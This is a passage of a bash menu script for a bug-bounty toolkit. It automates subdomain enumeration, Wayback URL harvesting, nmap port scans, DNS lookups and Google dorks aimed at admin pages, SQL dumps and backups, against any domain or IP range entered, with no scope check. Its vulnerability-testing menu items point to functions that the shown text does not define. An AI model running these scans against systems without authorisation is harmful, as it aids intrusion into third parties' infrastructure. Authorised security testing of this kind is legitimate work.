#!/bin/bash
# Ultimate Bug Bounty Toolkit Menu
# Author: Security Research Team
# Version: 3.0
# Enhanced unified menu system for all bug bounty tools

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
RESULTS_DIR="$SCRIPT_DIR/results"
CONFIG_FILE="$SCRIPT_DIR/.bug_bounty_config"
LOG_FILE="$SCRIPT_DIR/bug_bounty.log"

# Global variables
TARGET=""
OUTPUT_DIR=""
SESSION_ID=""

# Create necessary directories
mkdir -p "$RESULTS_DIR"

# Logging function
log_action() {
    local message="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $message" >> "$LOG_FILE"
}

# Error handling
error_exit() {
    local message="$1"
    echo -e "${RED}[ERROR] $message${NC}" >&2
    log_action "ERROR: $message"
    exit 1
}

# Success message
success_msg() {
    local message="$1"
    echo -e "${GREEN}[SUCCESS] $message${NC}"
    log_action "SUCCESS: $message"
}

# Info message
info_msg() {
    local message="$1"
    echo -e "${BLUE}[INFO] $message${NC}"
    log_action "INFO: $message"
}

# Warning message
warn_msg() {
    local message="$1"
    echo -e "${YELLOW}[WARNING] $message${NC}"
    log_action "WARNING: $message"
}

# Banner
print_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗    ║
║    ██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝    ║
║    ██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝     ║
║    ██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝      ║
║    ██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║       ║
║    ╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝       ║
║                                                                              ║
║                        ULTIMATE TOOLKIT v3.0                                ║
║                      Enhanced Security Research Suite                        ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${WHITE}                         Welcome to the Ultimate Bug Bounty Toolkit${NC}"
    echo -e "${YELLOW}                    Comprehensive Security Testing & Reconnaissance${NC}"
    echo ""
}

# Check dependencies
check_dependencies() {
    local missing_tools=()
    local required_tools=(
        "curl" "wget" "git" "python3" "jq" "sort" "uniq" "grep" "sed" "awk"
        "nmap" "dig" "nslookup" "whois"
    )
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -ne 0 ]; then
        warn_msg "Missing tools: ${missing_tools[*]}"
        echo -e "${YELLOW}[*] Install missing tools for full functionality${NC}"
    else
        success_msg "All core dependencies satisfied"
    fi
}

# Tool availability check
check_tool_availability() {
    local tool_status=()
    
    # Bug bounty specific tools
    local bb_tools=(
        "subfinder:Subdomain enumeration"
        "httpx:HTTP toolkit"
        "nuclei:Vulnerability scanner" 
        "katana:Web crawler"
        "waybackurls:Archive URL discovery"
        "assetfinder:Asset discovery"
        "ffuf:Web fuzzer"
        "dalfox:XSS scanner"
        "sqlmap:SQL injection tool"
        "arjun:Parameter discovery"
        "gau:URL discovery"
        "naabu:Port scanner"
    )
    
    echo -e "\n${CYAN}[*] Bug Bounty Tool Availability:${NC}"
    for tool_desc in "${bb_tools[@]}"; do
        IFS=':' read -r tool desc <<< "$tool_desc"
        if command -v "$tool" &> /dev/null; then
            echo -e "  ${GREEN}✓${NC} $tool - $desc"
        else
            echo -e "  ${RED}✗${NC} $tool - $desc (not installed)"
        fi
    done
}

# Load configuration
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
        info_msg "Configuration loaded"
    else
        # Create default config
        cat > "$CONFIG_FILE" << EOF
# Bug Bounty Toolkit Configuration
DEFAULT_THREADS=50
DEFAULT_TIMEOUT=30
DEFAULT_DELAY=1
WORDLIST_DIR="/usr/share/wordlists"
NUCLEI_TEMPLATES_DIR="$HOME/nuclei-templates"
OUTPUT_FORMAT="both"
ENABLE_SCREENSHOTS=true
AUTO_ORGANIZE=true
EOF
        info_msg "Default configuration created"
    fi
}

# Set target
set_target() {
    echo -e "\n${CYAN}╔══════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║           TARGET CONFIGURATION      ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════╝${NC}"
    
    echo -e "\n${YELLOW}Select target type:${NC}"
    echo "1. Single domain (e.g., example.com)"
    echo "2. Subdomain list file"
    echo "3. URL list file"
    echo "4. IP address/CIDR"
    echo "0. Back to main menu"
    
    read -p "$(echo -e "${BLUE}[+] Enter choice: ${NC}")" choice
    
    case $choice in
        1)
            read -p "$(echo -e "${BLUE}[+] Enter domain: ${NC}")" domain
            if [[ $domain =~ ^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$ ]]; then
                TARGET="$domain"
                TARGET_TYPE="domain"
                create_session_dir
                echo "$TARGET" > "$SCRIPT_DIR/.last_target"
                success_msg "Target set to: $TARGET"
            else
                error_exit "Invalid domain format"
            fi
            ;;
        2)
            read -p "$(echo -e "${BLUE}[+] Enter path to subdomain list: ${NC}")" file_path
            if [ -f "$file_path" ]; then
                TARGET="$file_path"
                TARGET_TYPE="subdomain_list"
                create_session_dir
                echo "$TARGET" > "$SCRIPT_DIR/.last_target"
                success_msg "Subdomain list loaded: $TARGET"
            else
                error_exit "File not found: $file_path"
            fi
            ;;
        3)
            read -p "$(echo -e "${BLUE}[+] Enter path to URL list: ${NC}")" file_path
            if [ -f "$file_path" ]; then
                TARGET="$file_path"
                TARGET_TYPE="url_list"
                create_session_dir
                echo "$TARGET" > "$SCRIPT_DIR/.last_target"
                success_msg "URL list loaded: $TARGET"
            else
                error_exit "File not found: $file_path"
            fi
            ;;
        4)
            read -p "$(echo -e "${BLUE}[+] Enter IP/CIDR: ${NC}")" ip_input
            TARGET="$ip_input"
            TARGET_TYPE="network"
            create_session_dir
            echo "$TARGET" > "$SCRIPT_DIR/.last_target"
            success_msg "Network target set: $TARGET"
            ;;
        0)
            return
            ;;
        *)
            warn_msg "Invalid choice"
            set_target
            ;;
    esac
}

# Create session directory
create_session_dir() {
    SESSION_ID=$(date +"%Y%m%d_%H%M%S")
    local clean_target=$(echo "$TARGET" | sed 's/[^a-zA-Z0-9._-]/_/g')
    OUTPUT_DIR="$RESULTS_DIR/${clean_target}_${SESSION_ID}"
    mkdir -p "$OUTPUT_DIR"
    
    # Create subdirectories
    mkdir -p "$OUTPUT_DIR"/{subdomains,urls,vulns,network,reports,screenshots}
    
    info_msg "Session directory created: $OUTPUT_DIR"
    echo "$OUTPUT_DIR" > "$SCRIPT_DIR/.last_session"
}

# Reconnaissance Menu
recon_menu() {
    while true; do
        echo -e "\n${PURPLE}╔═══════════════════════════════════════╗${NC}"
        echo -e "${PURPLE}║           RECONNAISSANCE MENU         ║${NC}"
        echo -e "${PURPLE}╚═══════════════════════════════════════╝${NC}"
        echo -e "${WHITE}Current Target: ${GREEN}${TARGET:-Not Set}${NC}"
        echo -e "${WHITE}Output Directory: ${CYAN}$(basename "${OUTPUT_DIR:-N/A}")${NC}"
        echo ""
        echo "1.  Subdomain Enumeration"
        echo "2.  DNS Analysis"
        echo "3.  Port Scanning"
        echo "4.  URL Discovery"
        echo "5.  Wayback Machine Analysis"
        echo "6.  Technology Detection"
        echo "7.  Certificate Analysis"
        echo "8.  WHOIS Information"
        echo "9.  Google Dorking"
        echo "10. Social Media OSINT"
        echo "11. Full Reconnaissance Suite"
        echo "0.  Back to Main Menu"
        
        read -p "$(echo -e "${BLUE}\n[+] Select option: ${NC}")" choice
        
        case $choice in
            1) subdomain_enumeration ;;
            2) dns_analysis ;;
            3) port_scanning ;;
            4) url_discovery ;;
            5) wayback_analysis ;;
            6) technology_detection ;;
            7) certificate_analysis ;;
            8) whois_analysis ;;
            9) google_dorking ;;
            10) social_osint ;;
            11) full_reconnaissance ;;
            0) break ;;
            *) warn_msg "Invalid option" ;;
        esac
    done
}

# Vulnerability Testing Menu
vuln_menu() {
    while true; do
        echo -e "\n${RED}╔═══════════════════════════════════════╗${NC}"
        echo -e "${RED}║        VULNERABILITY TESTING         ║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════╝${NC}"
        echo -e "${WHITE}Current Target: ${GREEN}${TARGET:-Not Set}${NC}"
        echo ""
        echo "1.  Nuclei Vulnerability Scan"
        echo "2.  SQL Injection Testing"
        echo "3.  XSS Testing"
        echo "4.  Directory Fuzzing"
        echo "5.  Parameter Discovery"
        echo "6.  CORS Testing"
        echo "7.  Command Injection Testing"
        echo "8.  File Upload Testing"
        echo "9.  Authentication Testing"
        echo "10. Full Vulnerability Suite"
        echo "0.  Back to Main Menu"
        
        read -p "$(echo -e "${BLUE}\n[+] Select option: ${NC}")" choice
        
        case $choice in
            1) nuclei_scan ;;
            2) sql_injection_test ;;
            3) xss_testing ;;
            4) directory_fuzzing ;;
            5) parameter_discovery ;;
            6) cors_testing ;;
            7) command_injection_test ;;
            8) file_upload_test ;;
            9) auth_testing ;;
            10) full_vulnerability_suite ;;
            0) break ;;
            *) warn_msg "Invalid option" ;;
        esac
    done
}

# Automation Menu
automation_menu() {
    while true; do
        echo -e "\n${GREEN}╔═══════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║            AUTOMATION SUITE           ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
        echo ""
        echo "1. Quick Scan (Basic reconnaissance)"
        echo "2. Standard Scan (Recon + Basic vulns)"
        echo "3. Comprehensive Scan (Full suite)"
        echo "4. Custom Workflow"
        echo "5. Schedule Recurring Scan"
        echo "6. Resume Previous Session"
        echo "0. Back to Main Menu"
        
        read -p "$(echo -e "${BLUE}\n[+] Select option: ${NC}")" choice
        
        case $choice in
            1) quick_scan ;;
            2) standard_scan ;;
            3) comprehensive_scan ;;
            4) custom_workflow ;;
            5) schedule_scan ;;
            6) resume_session ;;
            0) break ;;
            *) warn_msg "Invalid option" ;;
        esac
    done
}

# Tools Menu
tools_menu() {
    while true; do
        echo -e "\n${YELLOW}╔═══════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║              TOOLS MENU               ║${NC}"
        echo -e "${YELLOW}╚═══════════════════════════════════════╝${NC}"
        echo ""
        echo "1.  Install/Update Tools"
        echo "2.  Check Tool Status"
        echo "3.  Configure Wordlists"
        echo "4.  Update Nuclei Templates"
        echo "5.  Custom Tool Launcher"
        echo "6.  Tool Configuration"
        echo "7.  Performance Tuning"
        echo "8.  Backup/Restore Settings"
        echo "9.  Swagger/API Testing"
        echo "10. JavaScript Reconnaissance"
        echo "11. Anonymous Reconnaissance"
        echo "12. Advanced Fuzzing"
        echo "0.  Back to Main Menu"
        
        read -p "$(echo -e "${BLUE}\n[+] Select option: ${NC}")" choice
        
        case $choice in
            1) install_tools ;;
            2) check_tool_availability ;;
            3) configure_wordlists ;;
            4) update_nuclei_templates ;;
            5) custom_tool_launcher ;;
            6) tool_configuration ;;
            7) performance_tuning ;;
            8) backup_restore ;;
            9) swagger_api_testing ;;
            10) javascript_recon ;;
            11) anonymous_recon ;;
            12) advanced_fuzzing ;;
            0) break ;;
            *) warn_msg "Invalid option" ;;
        esac
    done
}

# Results & Reporting Menu
results_menu() {
    while true; do
        echo -e "\n${CYAN}╔═══════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║         RESULTS & REPORTING           ║${NC}"
        echo -e "${CYAN}╚═══════════════════════════════════════╝${NC}"
        echo ""
        echo "1. View Current Session Results"
        echo "2. Generate HTML Report"
        echo "3. Generate JSON Report"
        echo "4. Export to CSV"
        echo "5. Compare Sessions"
        echo "6. Archive Results"
        echo "7. Clean Old Results"
        echo "8. View Statistics"
        echo "9. Send Report via Email"
        echo "0. Back to Main Menu"
        
        read -p "$(echo -e "${BLUE}\n[+] Select option: ${NC}")" choice
        
        case $choice in
            1) view_results ;;
            2) generate_html_report ;;
            3) generate_json_report ;;
            4) export_csv ;;
            5) compare_sessions ;;
            6) archive_results ;;
            7) clean_old_results ;;
            8) view_statistics ;;
            9) email_report ;;
            0) break ;;
            *) warn_msg "Invalid option" ;;
        esac
    done
}

# Subdomain enumeration function
subdomain_enumeration() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting subdomain enumeration for $TARGET"
    
    local output_file="$OUTPUT_DIR/subdomains/all_subdomains.txt"
    
    # Create combined subdomain enumeration
    {
        echo -e "${YELLOW}[*] Running Subfinder...${NC}"
        if command -v subfinder &> /dev/null; then
            subfinder -d "$TARGET" -silent -o "$OUTPUT_DIR/subdomains/subfinder.txt"
        else
            warn_msg "Subfinder not installed"
        fi
        
        echo -e "${YELLOW}[*] Running AssetFinder...${NC}"
        if command -v assetfinder &> /dev/null; then
            assetfinder "$TARGET" > "$OUTPUT_DIR/subdomains/assetfinder.txt"
        else
            warn_msg "AssetFinder not installed"
        fi
        
        # Certificate transparency
        echo -e "${YELLOW}[*] Checking Certificate Transparency...${NC}"
        curl -s "https://crt.sh/?q=%.$TARGET&output=json" | jq -r '.[].name_value' 2>/dev/null | sort -u > "$OUTPUT_DIR/subdomains/crt_sh.txt"
        
        # Combine and deduplicate
        cat "$OUTPUT_DIR/subdomains"/*.txt 2>/dev/null | sort -u > "$output_file"
        
        local count=$(wc -l < "$output_file" 2>/dev/null || echo "0")
        success_msg "Found $count unique subdomains"
        
        # Probe for live hosts
        if command -v httpx &> /dev/null && [ "$count" -gt 0 ]; then
            info_msg "Probing for live hosts..."
            httpx -l "$output_file" -silent -o "$OUTPUT_DIR/subdomains/live_subdomains.txt"
            local live_count=$(wc -l < "$OUTPUT_DIR/subdomains/live_subdomains.txt" 2>/dev/null || echo "0")
            success_msg "Found $live_count live subdomains"
        fi
        
    } 2>&1 | tee "$OUTPUT_DIR/subdomains/enumeration.log"
}

# Wayback analysis function
wayback_analysis() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting Wayback Machine analysis for $TARGET"
    
    # Use enhanced wayback script
    if [ -f "$SCRIPT_DIR/wayback.sh" ]; then
        cd "$OUTPUT_DIR/urls"
        bash "$SCRIPT_DIR/wayback.sh" "$TARGET" 2
        cd - > /dev/null
        success_msg "Wayback analysis completed"
    else
        warn_msg "Enhanced wayback script not found, using fallback method"
        # Fallback wayback analysis
        curl -s "http://web.archive.org/cdx/search/cdx?url=*.$TARGET/*&output=txt&fl=original&collapse=urlkey" | sort -u > "$OUTPUT_DIR/urls/wayback_urls.txt"
        local count=$(wc -l < "$OUTPUT_DIR/urls/wayback_urls.txt" 2>/dev/null || echo "0")
        success_msg "Found $count URLs from Wayback Machine"
    fi
}

# Google dorking function
google_dorking() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting Google dorking for $TARGET"
    
    if [ -f "$SCRIPT_DIR/dorking.py" ]; then
        cd "$OUTPUT_DIR"
        python3 "$SCRIPT_DIR/dorking.py" -d "$TARGET" --export json
        cd - > /dev/null
        success_msg "Google dorking completed"
    else
        warn_msg "Enhanced dorking script not found, creating manual dorks"
        # Create manual Google dorks
        local dorks_file="$OUTPUT_DIR/google_dorks.txt"
        cat > "$dorks_file" << EOF
site:$TARGET
site:$TARGET filetype:pdf
site:$TARGET filetype:doc
site:$TARGET filetype:xls
site:$TARGET inurl:admin
site:$TARGET inurl:login
site:$TARGET inurl:config
site:$TARGET inurl:backup
site:$TARGET ext:sql
site:$TARGET ext:log
EOF
        success_msg "Created manual Google dorks in $dorks_file"
    fi
}

# Quick scan function
quick_scan() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting quick scan for $TARGET"
    
    # Basic reconnaissance
    subdomain_enumeration
    
    # Quick port scan if live hosts found
    if [ -f "$OUTPUT_DIR/subdomains/live_subdomains.txt" ]; then
        info_msg "Running quick port scan..."
        if command -v nmap &> /dev/null; then
            head -5 "$OUTPUT_DIR/subdomains/live_subdomains.txt" | while read -r host; do
                clean_host=$(echo "$host" | sed 's|https\?://||')
                nmap -T4 --top-ports 100 "$clean_host" > "$OUTPUT_DIR/network/nmap_${clean_host//[^a-zA-Z0-9]/_}.txt" 2>/dev/null &
            done
            wait
        fi
    fi
    
    success_msg "Quick scan completed"
    generate_quick_report
}

# Generate Standard Report
generate_standard_report() {
    local report_file="$OUTPUT_DIR/reports/standard_report.html"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Standard Scan Report - $TARGET</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background: #3498db; color: white; padding: 20px; border-radius: 5px; }
        .section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
        .stats { background: #ecf0f1; }
        .findings { background: #fff3cd; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔍 Standard Scan Report</h1>
        <p>Target: $TARGET | Generated: $(date)</p>
    </div>
    
    <div class="section stats">
        <h2>📊 Summary</h2>
        <ul>
            <li>🎯 Subdomains: $([ -f "$OUTPUT_DIR/subdomains/all_subdomains.txt" ] && wc -l < "$OUTPUT_DIR/subdomains/all_subdomains.txt" || echo "0")</li>
            <li>🌐 Live Hosts: $([ -f "$OUTPUT_DIR/subdomains/live_subdomains.txt" ] && wc -l < "$OUTPUT_DIR/subdomains/live_subdomains.txt" || echo "0")</li>
            <li>🚨 Vulnerabilities: $([ -f "$OUTPUT_DIR/vulns/nuclei_scan.txt" ] && wc -l < "$OUTPUT_DIR/vulns/nuclei_scan.txt" || echo "0")</li>
        </ul>
    </div>
</body>
</html>
EOF
    
    success_msg "Standard report generated: $report_file"
}

# Generate Comprehensive Report
generate_comprehensive_report() {
    local report_file="$OUTPUT_DIR/reports/comprehensive_report.html"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Comprehensive Security Assessment - $TARGET</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f8f9fa; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; text-align: center; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin: 20px 0; }
        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .metric { font-size: 2em; font-weight: bold; color: #3498db; }
        .critical { border-left: 5px solid #e74c3c; }
        .warning { border-left: 5px solid #f39c12; }
        .success { border-left: 5px solid #27ae60; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🛡️ Comprehensive Security Assessment</h1>
        <h2>$TARGET</h2>
        <p>Complete reconnaissance and vulnerability analysis</p>
        <p>Generated: $(date)</p>
    </div>
    
    <div class="grid">
        <div class="card">
            <h3>🎯 Reconnaissance</h3>
            <div class="metric">$([ -f "$OUTPUT_DIR/subdomains/all_subdomains.txt" ] && wc -l < "$OUTPUT_DIR/subdomains/all_subdomains.txt" || echo "0")</div>
            <p>Subdomains Discovered</p>
        </div>
        <div class="card">
            <h3>🌐 Live Assets</h3>
            <div class="metric">$([ -f "$OUTPUT_DIR/subdomains/live_subdomains.txt" ] && wc -l < "$OUTPUT_DIR/subdomains/live_subdomains.txt" || echo "0")</div>
            <p>Active Hosts</p>
        </div>
        <div class="card">
            <h3>🚨 Security Issues</h3>
            <div class="metric">$([ -f "$OUTPUT_DIR/vulns/nuclei_scan.txt" ] && wc -l < "$OUTPUT_DIR/vulns/nuclei_scan.txt" || echo "0")</div>
            <p>Vulnerabilities Found</p>
        </div>
    </div>
    
    <div class="card">
        <h2>📋 Assessment Summary</h2>
        <p>This comprehensive assessment included:</p>
        <ul>
            <li>Complete subdomain enumeration</li>
            <li>DNS and network analysis</li>
            <li>Technology fingerprinting</li>
            <li>Vulnerability scanning with Nuclei</li>
            <li>Manual security testing</li>
        </ul>
    </div>
</body>
</html>
EOF
    
    success_msg "Comprehensive report generated: $report_file"
}

# Generate Reconnaissance Report
generate_recon_report() {
    local report_file="$OUTPUT_DIR/reports/reconnaissance_report.html"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Reconnaissance Report - $TARGET</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background: #8e44ad; color: white; padding: 20px; border-radius: 5px; }
        .section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
        .data { background: #f8f9fa; padding: 10px; border-radius: 3px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔍 Reconnaissance Report</h1>
        <p>Target: $TARGET | Generated: $(date)</p>
    </div>
    
    <div class="section">
        <h2>🎯 Subdomain Discovery</h2>
        <p>Total subdomains found: $([ -f "$OUTPUT_DIR/subdomains/all_subdomains.txt" ] && wc -l < "$OUTPUT_DIR/subdomains/all_subdomains.txt" || echo "0")</p>
        <p>Live subdomains: $([ -f "$OUTPUT_DIR/subdomains/live_subdomains.txt" ] && wc -l < "$OUTPUT_DIR/subdomains/live_subdomains.txt" || echo "0")</p>
    </div>
    
    <div class="section">
        <h2>🌐 Network Information</h2>
        <p>DNS, WHOIS, and certificate analysis completed</p>
        <p>Technology detection performed</p>
    </div>
</body>
</html>
EOF
    
    success_msg "Reconnaissance report generated: $report_file"
}

# Generate Vulnerability Report
generate_vuln_report() {
    local report_file="$OUTPUT_DIR/reports/vulnerability_report.html"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Vulnerability Assessment - $TARGET</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background: #e74c3c; color: white; padding: 20px; border-radius: 5px; }
        .section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
        .critical { background: #fdf2f2; border-left: 5px solid #e74c3c; }
        .high { background: #fef9e7; border-left: 5px solid #f39c12; }
        .medium { background: #f0f9ff; border-left: 5px solid #3498db; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🚨 Vulnerability Assessment</h1>
        <p>Target: $TARGET | Generated: $(date)</p>
    </div>
    
    <div class="section">
        <h2>📊 Vulnerability Summary</h2>
        <p>Total issues found: $([ -f "$OUTPUT_DIR/vulns/nuclei_scan.txt" ] && wc -l < "$OUTPUT_DIR/vulns/nuclei_scan.txt" || echo "0")</p>
    </div>
    
    <div class="section">
        <h2>🔍 Testing Coverage</h2>
        <ul>
            <li>Nuclei vulnerability scanning</li>
            <li>SQL injection testing</li>
            <li>XSS vulnerability testing</li>
            <li>Directory fuzzing</li>
            <li>Authentication testing</li>
        </ul>
    </div>
</body>
</html>
EOF
    
    success_msg "Vulnerability report generated: $report_file"
}

# Generate quick report
generate_quick_report() {
    local report_file="$OUTPUT_DIR/reports/quick_scan_report.html"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Quick Scan Report - $TARGET</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background: #007bff; color: white; padding: 20px; border-radius: 5px; }
        .section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
        .stats { background: #f8f9fa; }
        .success { background: #d4edda; }
        ul { list-style-type: none; }
        li { padding: 5px 0; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔍 Quick Scan Report</h1>
        <p>Target: $TARGET | Generated: $(date)</p>
    </div>
    
    <div class="section stats">
        <h2>📊 Summary</h2>
        <ul>
            <li>🎯 Subdomains Found: $([ -f "$OUTPUT_DIR/subdomains/all_subdomains.txt" ] && wc -l < "$OUTPUT_DIR/subdomains/all_subdomains.txt" || echo "0")</li>
            <li>🌐 Live Hosts: $([ -f "$OUTPUT_DIR/subdomains/live_subdomains.txt" ] && wc -l < "$OUTPUT_DIR/subdomains/live_subdomains.txt" || echo "0")</li>
            <li>📁 Scan Duration: Quick scan (basic reconnaissance only)</li>
        </ul>
    </div>
    
    <div class="section success">
        <h2>✅ Next Steps</h2>
        <ul>
            <li>Run comprehensive scan for detailed analysis</li>
            <li>Perform vulnerability testing on live hosts</li>
            <li>Conduct manual testing of interesting findings</li>
        </ul>
    </div>
</body>
</html>
EOF
    
    success_msg "Quick report generated: $report_file"
}

# Configuration and settings
settings_menu() {
    while true; do
        echo -e "\n${PURPLE}╔═══════════════════════════════════════╗${NC}"
        echo -e "${PURPLE}║            SETTINGS MENU              ║${NC}"
        echo -e "${PURPLE}╚═══════════════════════════════════════╝${NC}"
        echo ""
        echo "1. View Current Configuration"
        echo "2. Edit Threading Settings"
        echo "3. Configure Timeouts"
        echo "4. Set Default Wordlists"
        echo "5. Notification Settings"
        echo "6. Export Configuration"
        echo "7. Import Configuration"
        echo "8. Reset to Defaults"
        echo "0. Back to Main Menu"
        
        read -p "$(echo -e "${BLUE}\n[+] Select option: ${NC}")" choice
        
        case $choice in
            1) view_config ;;
            2) edit_threading ;;
            3) configure_timeouts ;;
            4) set_wordlists ;;
            5) notification_settings ;;
            6) export_config ;;
            7) import_config ;;
            8) reset_config ;;
            0) break ;;
            *) warn_msg "Invalid option" ;;
        esac
    done
}

# View current configuration
view_config() {
    echo -e "\n${CYAN}[*] Current Configuration:${NC}"
    if [ -f "$CONFIG_FILE" ]; then
        cat "$CONFIG_FILE"
    else
        warn_msg "No configuration file found"
    fi
}

# Main menu
main_menu() {
    while true; do
        print_banner
        echo -e "${WHITE}Current Target: ${GREEN}${TARGET:-Not Set}${NC}"
        echo -e "${WHITE}Session: ${CYAN}$(basename "${OUTPUT_DIR:-N/A}")${NC}"
        echo ""
        echo -e "${BOLD}${WHITE}═══════════════════ MAIN MENU ═══════════════════${NC}"
        echo ""
        echo "1. 🎯 Set Target"
        echo "2. 🔍 Reconnaissance Suite"
        echo "3. 🛡️  Vulnerability Testing"
        echo "4. 🤖 Automation & Workflows"
        echo "5. 🛠️  Tools Management"
        echo "6. 📊 Results & Reporting"
        echo "7. ⚙️  Settings & Configuration"
        echo "8. ℹ️  Help & Documentation"
        echo "9. 📈 Tool Status & Dependencies"
        echo "0. 🚪 Exit"
        
        echo ""
        read -p "$(echo -e "${BLUE}${BOLD}[+] Select option: ${NC}")" choice
        
        case $choice in
            1) set_target ;;
            2) recon_menu ;;
            3) vuln_menu ;;
            4) automation_menu ;;
            5) tools_menu ;;
            6) results_menu ;;
            7) settings_menu ;;
            8) show_help ;;
            9) check_tool_availability ;;
            0) 
                echo -e "${GREEN}[+] Thank you for using Bug Bounty Toolkit!${NC}"
                echo -e "${YELLOW}[+] Happy hunting! 🎯${NC}"
                exit 0
                ;;
            *)
                warn_msg "Invalid option. Please try again."
                sleep 1
                ;;
        esac
        
        if [ "$choice" != "8" ] && [ "$choice" != "9" ]; then
            echo ""
            read -p "Press Enter to continue..."
        fi
    done
}

# Help function
show_help() {
    echo -e "\n${CYAN}╔═══════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║              HELP & INFO              ║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${WHITE}Bug Bounty Toolkit v3.0${NC}"
    echo -e "${YELLOW}A comprehensive security testing and reconnaissance suite${NC}"
    echo ""
    echo -e "${BOLD}Features:${NC}"
    echo "• Automated subdomain enumeration"
    echo "• Comprehensive vulnerability scanning"
    echo "• URL discovery and analysis"
    echo "• Port scanning and service detection"
    echo "• Custom workflow automation"
    echo "• Detailed HTML/JSON reporting"
    echo "• Session management and persistence"
    echo ""
    echo -e "${BOLD}Usage:${NC}"
    echo "1. Set a target (domain, IP, or file)"
    echo "2. Choose reconnaissance or vulnerability testing"
    echo "3. Review results in the reporting section"
    echo ""
    echo -e "${BOLD}Tips:${NC}"
    echo "• Use automation workflows for comprehensive scans"
    echo "• Configure tools in the settings menu"
    echo "• Check tool status before running scans"
    echo "• Results are automatically organized by session"
    echo ""
    echo -e "${GREEN}For more information, visit: https://github.com/security-research/bug-bounty-toolkit${NC}"
}

# DNS Analysis function
dns_analysis() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting DNS analysis for $TARGET"
    local dns_output="$OUTPUT_DIR/network/dns_analysis.txt"
    
    {
        echo "=== DNS Analysis for $TARGET ==="
        echo "Date: $(date)"
        echo ""
        
        echo "=== A Records ==="
        dig +short A "$TARGET" || echo "No A records found"
        
        echo ""
        echo "=== AAAA Records ==="
        dig +short AAAA "$TARGET" || echo "No AAAA records found"
        
        echo ""
        echo "=== MX Records ==="
        dig +short MX "$TARGET" || echo "No MX records found"
        
        echo ""
        echo "=== TXT Records ==="
        dig +short TXT "$TARGET" || echo "No TXT records found"
        
        echo ""
        echo "=== NS Records ==="
        dig +short NS "$TARGET" || echo "No NS records found"
        
        echo ""
        echo "=== SOA Records ==="
        dig +short SOA "$TARGET" || echo "No SOA records found"
        
    } > "$dns_output"
    
